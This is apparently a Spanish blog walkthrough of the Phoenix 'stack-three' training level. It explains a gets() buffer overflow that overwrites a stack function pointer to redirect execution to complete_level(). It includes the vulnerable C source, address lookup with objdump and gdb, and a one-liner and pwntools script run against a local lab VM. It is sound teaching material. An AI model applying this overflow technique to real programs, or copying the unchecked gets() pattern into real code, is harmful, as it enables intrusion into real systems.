---
layout: single
title: "Stack Three"
permalink: /pwn/phoenix/stack-three/
parent: Phoenix
comments: true
excerpt: "Stack Three"
classes: wide
header:
  teaser: /assets/images/2025-08-17-Phoenix/logo.jpg
categories: [PWN]
tags: [PWN, Linux, Hacking, Easy]
---

![Untitled](/assets/images/2025-08-17-Phoenix/banner.png)

En este nivel se introduce el concepto de **sobrescritura de punteros de función** en la pila.  
El objetivo es modificar el puntero `fp` para que apunte a la función `complete_level()`.

**Consejos:**
- Se puede usar `gdb` y `objdump` para obtener la dirección de la función `complete_level()`.
- El overflow permitirá sobreescribir el puntero de función almacenado justo después del buffer.

## Análisis del código

El programa contiene:

Un buffer de 64 bytes (locals.buffer).

Un puntero a función (locals.fp), inicializado en NULL.

La vulnerabilidad está en el uso de gets(), que permite escribir más allá de los 64 bytes, sobreescribiendo el puntero fp.
Si logramos que fp apunte a complete_level(), se ejecutará y se completará el reto.


```c
/*
 * phoenix/stack-three, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable to 0x0d0a090a
 *
 * When does a joke become a dad joke?
 *   When it becomes apparent.
 *   When it's fully groan up.
 *
 */

#include <err.h>    // Biblioteca para manejo de errores y salida
#include <stdio.h>  // Biblioteca estándar para entrada y salida (printf, fflush, etc.)
#include <stdlib.h> // Biblioteca para funciones generales, como exit() y malloc()
#include <string.h> // Biblioteca para manipulación de cadenas (gets, strcpy, etc.)
#include <unistd.h> // Biblioteca para funciones del sistema POSIX (sleep, fork, etc.)

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"
// Define una constante con el mensaje que se imprimirá al inicio del programa

char *gets(char *); 
// Declaración de la función 'gets', que permite leer una línea de texto desde la entrada estándar

void complete_level() { 
  // Función para completar el nivel
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  // Muestra un mensaje de felicitación si se completa el nivel
  exit(0); // Sale del programa
}

int main(int argc, char **argv) {
  // Función principal que toma argumentos desde la línea de comandos
  struct {
    char buffer[64];        // Reserva 64 bytes para almacenar la entrada del usuario
    volatile int (*fp)();   // Puntero a función que debe ser modificado por el exploit
  } locals; // Declara la estructura que contendrá el buffer y el puntero a la función

  printf("%s\n", BANNER);
  // Imprime el banner de bienvenida

  locals.fp = NULL;
  // Inicializa el puntero a función a NULL

  gets(locals.buffer);
  // Lee la entrada del usuario con gets() y la guarda en 'buffer' (sin verificar límites, lo que permite un desbordamiento de buffer)

  if (locals.fp) {
    // Si el puntero a la función no es NULL (es decir, ha sido modificado por el atacante)
    printf("calling function pointer @ %p\n", locals.fp);
    // Imprime la dirección de la función que se va a llamar
    fflush(stdout);
    // Fuerza a que los datos pendientes se escriban en la salida estándar
    locals.fp();
    // Llama a la función apuntada por 'fp'
  } else {
    // Si el puntero a la función sigue siendo NULL (no ha sido modificado)
    printf("function pointer remains unmodified :~( better luck next time!\n");
    // Imprime un mensaje indicando que el puntero no ha sido modificado
  }

  exit(0); 
  // Termina el programa correctamente
}
```

**Encontrando la dirección de complete_level()**

Podemos ubicar la dirección con objdump con el comando `objdump -d stack-three | grep complete_level`

```c
user@phoenix-amd64:/opt/phoenix/amd64$ objdump -d stack-three | grep complete_level
000000000040069d <complete_level>:
```

O también con la herramienta gdb con el comando `info func`

```c
user@phoenix-amd64:/opt/phoenix/amd64$ gdb ./stack-three
GNU gdb (GDB) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-pc-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
71 commands loaded for GDB 8.2.1 using Python engine 3.5
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./stack-three...(no debugging symbols found)...done.
gef➤  info func
All defined functions:

Non-debugging symbols:
0x00000000004004b0  _init
0x00000000004004d0  printf@plt
0x00000000004004e0  gets@plt
0x00000000004004f0  puts@plt
0x0000000000400500  fflush@plt
0x0000000000400510  exit@plt
0x0000000000400520  __libc_start_main@plt
0x0000000000400530  _start
0x0000000000400546  _start_c
0x0000000000400570  deregister_tm_clones
0x00000000004005a0  register_tm_clones
0x00000000004005e0  __do_global_dtors_aux
0x0000000000400670  frame_dummy
0x000000000040069d  complete_level
0x00000000004006b5  main
0x0000000000400740  __do_global_ctors_aux
0x0000000000400782  _fini
```

**Explotación manual**

Si enviamos 64 caracteres seguidos de la dirección de complete_level(), como nos pide el reto, sobrescribiremos el puntero de función: En arquitecturas de 64 bits es mejor usar p64 para garantizar el formato correcto de la dirección.

```c
user@phoenix-amd64:/opt/phoenix/amd64$  python -c 'print "A"*64 + "\x9d\x06\x40"' | ./stack-three
Welcome to phoenix/stack-three, brought to you by https://exploit.education
calling function pointer @ 0x40069d
Congratulations, you've finished phoenix/stack-three :-) Well done!
```

**Exploit con Pwntools**

Creamos un script en Python3 para automatizarlo:

```c
┌──(root㉿angussMoody)-[/mnt/angussMoody/PWN/Phoenix/3_stack-three]
└─# cat Remote_exploit.py 
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: Remote_exploit.py
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ #!/usr/bin/env python3
   2   │ from pwn import *
   3   │ import time
   4   │ 
   5   │ # Conectar al proceso remoto
   6   │ ssh_connection = ssh(user='user', host='localhost', password='user', port=2222)
   7   │ 
   8   │ # Definir el payload
   9   │ payload = b"A" * 64
  10   │ payload += p64(0x40069d)  # Asegúrate de que la dirección esté bien
  11   │ 
  12   │ # Ejecutar el programa remoto
  13   │ process = ssh_connection.process('/opt/phoenix/amd64/stack-three')
  14   │ 
  15   │ # Enviar el payload
  16   │ process.sendline(payload)
  17   │ 
  18   │ # Esperar un poco para asegurar que todo se haya enviado
  19   │ time.sleep(1)
  20   │ 
  21   │ # captura la respuesta y la envía
  22   │ flag = process.recvall().decode()
  23   │ log.success("Output: " + flag)
  24   │ 
  25   │ # Cerrar el proceso
  26   │ process.close()
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────
```

**Resultado final**

Se evidencia el mensaje que indica que el reto fue resuelto

```c
┌──(root㉿angussMoody)-[/mnt/angussMoody/PWN/Phoenix/3_stack-three]
└─# python3 Remote_exploit.py 
[+] Connecting to localhost on port 2222: Done
[*] user@localhost:
    Distro    Unknown 
    OS:       linux
    Arch:     amd64
    Version:  4.9.0
    ASLR:     Disabled
    SHSTK:    Disabled
    IBT:      Disabled
    Note:     Susceptible to ASLR ulimit trick (CVE-2016-3672)
[+] Starting remote process None on localhost: pid 906
[!] ASLR is disabled for '/opt/phoenix/amd64/stack-three'!
[+] Receiving all data: Done (180B)
[*] Stopped remote process 'stack-three' on localhost (pid 906)
[+] Output: Welcome to phoenix/stack-three, brought to you by https://exploit.education
    calling function pointer @ 0x40069d
    Congratulations, you've finished phoenix/stack-three :-) Well done!
```

**Conclusión**

En este reto vimos cómo es posible manipular punteros de función mediante un buffer overflow, redirigiendo la ejecución del programa hacia una función específica.

Puntos clave:

  - Las funciones inseguras como gets() permiten escribir más allá de la memoria asignada.

  - Los punteros de función en la pila son objetivos directos para un atacante.

  - Controlar el flujo del programa a través de estos punteros es una técnica básica pero poderosa en explotación binaria.